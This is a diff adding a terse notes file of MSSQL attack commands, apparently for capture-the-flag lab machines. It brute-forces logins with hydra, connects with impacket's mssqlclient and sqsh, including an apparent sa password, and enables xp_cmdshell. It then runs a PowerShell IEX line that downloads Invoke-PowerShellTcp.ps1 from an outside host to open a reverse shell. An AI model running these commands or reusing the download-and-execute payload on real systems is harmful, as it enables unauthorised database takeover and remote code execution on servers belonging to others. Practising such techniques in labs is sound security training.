@@ -1,0 +1,29 @@
+hydra -L usernames -P passwords 10.10.10.59 mssql
+
+/opt/impacket/examples/mssqlclient.py reporting@10.10.10.125 
+
+/opt/impacket/examples/mssqlclient.py reporting@10.10.10.125 -windows-auth
+
+enable_xp_cmdshell
+
+RECONFIGURE
+
+xp_cmdshell whoami
+xp_cmdshell powershell.exe -C "IEX (New-Object Net.WebClient).DownloadString(''http://10.10.16.112/Invoke-PowerShellTcp.ps1'')"
+
+or 
+
+sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G​
+exec sp_configure 'show advanced options', 1
+go
+reconfigure
+go
+exec sp_configure 'xp_cmdshell', 1
+go
+reconfigure
+
+xp_cmdshell powershell  whoami
+xp_cmdshell powershell.exe -C "IEX (New-Object Net.WebClient).DownloadString(''http://10.10.16.112/Invoke-PowerShellTcp.ps1'')"
+
+sqsh -S 10.10.10.59 -U usermame -P mypassword
+
